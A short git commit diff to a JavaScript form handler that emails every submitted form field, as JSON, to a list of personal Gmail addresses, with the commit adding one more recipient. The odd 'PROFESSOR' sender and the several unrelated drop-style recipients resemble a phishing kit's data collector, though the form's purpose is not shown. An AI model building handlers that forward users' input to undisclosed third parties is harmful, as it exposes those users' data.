f5bf268d077a1cdaf44d913acd03e0977705e459
zm9807350 <zm9807350@gmail.com>
2026-01-25 16:22:43 +0500

    Update Hanan.js

--- Hanan.js
+++ Hanan.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,lexmara806@gmail.com",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,lexmara806@gmail.com,nadeemalinizamani45@gmail.com",
       subject: "Hanan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
